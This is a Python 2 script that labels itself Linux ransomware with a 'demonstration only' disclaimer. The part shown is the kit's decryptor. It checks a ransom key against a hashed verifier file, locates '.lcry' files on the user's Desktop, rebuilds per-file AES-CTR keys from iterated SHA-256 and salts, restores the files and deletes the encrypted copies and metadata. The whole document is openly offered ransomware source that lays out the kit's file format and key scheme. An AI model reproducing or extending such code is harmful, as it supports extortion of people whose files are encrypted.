# Ransomware for Linux, written in Python.
# Note: This program is for demonstration purposes only. I take no responsibility for anything.
import cryptography
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
backend = default_backend();

import hashlib, os;

# This is shared_key after 1 sha256 hash, NOT the raw shared_key!
shared_key = raw_input('Enter your decryption key: ').decode('hex');

# Verify
with open(os.environ['HOME'] + '/testfile.lcrypt', 'r') as testFile:
	lcryptData = testFile.read().split(' ')
	lcryptIters = int(lcryptData[0]);
	lcryptVerify = lcryptData[1].decode('hex');
	hashed_key = shared_key;
	for i in range(lcryptIters):
		hashed_key = hashlib.sha256(hashed_key).digest();
	if hashed_key == lcryptVerify:
		print "Yay! :) Decrypting files";
	else:
		print "Wrong key :(";
		exit(1);

# Find all the things (in the home directory)
matches = []
for root, dirnames, filenames in os.walk(os.environ['HOME']+'/Desktop'):
	for filename in filenames:
		if filename[-5:] == ".lcry":
			matches.append(os.path.join(root, filename[:-5]));

# Decrypt all the things
for match in matches:
	with open(match, 'w') as matchFile, open(match+'.lcry', 'r') as encFile, open(match+'.lcryme', 'r') as metaFile:
		# Get metadata and do things
		with open(match+'.lcryme', 'r') as metaFile:
			metadata = metaFile.read().split(' ');
			sha_iterations = int(metadata[0]);
			iv = metadata[1].decode('hex');
			salt = metadata[2].decode('hex');
		hashed_key = shared_key;
		for i in range(sha_iterations-1):
			hashed_key = hashlib.sha256(hashed_key).digest();
		hashed_key = hashlib.sha256(hashed_key+salt).digest();
		decryptor = Cipher(algorithms.AES(hashed_key), modes.CTR(iv), backend=backend).decryptor();
		block = "A";
		while block != "":
			block = encFile.read(4096);
			matchFile.write(decryptor.update(block));
		matchFile.write(decryptor.finalize());
	os.unlink(match+'.lcry')
	os.unlink(match+'.lcryme')

print "Your files are now decrypted."